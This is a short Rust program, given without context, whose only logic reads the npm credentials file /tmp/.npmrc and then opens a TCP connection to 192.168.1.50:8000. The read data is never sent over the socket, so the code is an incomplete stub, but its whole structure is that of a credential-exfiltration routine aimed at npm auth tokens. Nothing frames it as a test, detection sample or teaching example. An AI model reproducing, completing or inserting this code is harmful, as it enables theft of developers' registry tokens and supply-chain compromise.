use std::fs;
use std::net::TcpStream;

fn main() {
    if let Ok(data) = fs::read_to_string("/tmp/.npmrc") {
        let _ = TcpStream::connect("192.168.1.50:8000");
    }
}
